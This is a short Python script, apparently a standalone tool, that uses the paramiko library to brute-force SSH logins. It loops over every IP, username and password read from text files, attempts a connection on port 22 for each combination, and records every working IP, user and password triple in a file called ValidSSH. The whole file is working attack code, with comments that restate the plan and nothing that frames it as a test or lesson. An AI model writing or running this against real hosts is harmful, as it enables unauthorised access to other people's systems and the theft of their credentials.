import paramiko
import os
import socket
IPs = open("IPs.txt","r")
Passwords = open("Passwords.txt","r")
Usernames = open("Usernames.txt","r")
ValidTargets = open("ValidSSH", "w")
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

ip = IPs.readlines()
passes = Passwords.readlines()
users = Usernames.readlines()

for target in ip:
	for user in users:
		for password in passes:
			try:
				client.connect(target.rstrip("\n\t"),22,user.rstrip("\n\t"),password.rstrip("\n\t"))
			except(paramiko.BadHostKeyException,paramiko.AuthenticationException, paramiko.SSHException, socket.error):
				print("Unable to connect to " + target + "with " + user.rstrip("\n\t") + "," + password.rstrip("\n\t"))
				client.close()
			else:
				client.close()
				ValidTargets.write(target.rstrip("\n\t") + ',' + user.rstrip("\n\t") + ',' + password.rstrip("\n\t") + '\n')

#set client to auto add signature
#automatically grab a set of password and username combos
#attempt to login
#if no error, login was a success
#if error it was not a success
#print out a list in the form:
#	IP,User,Password
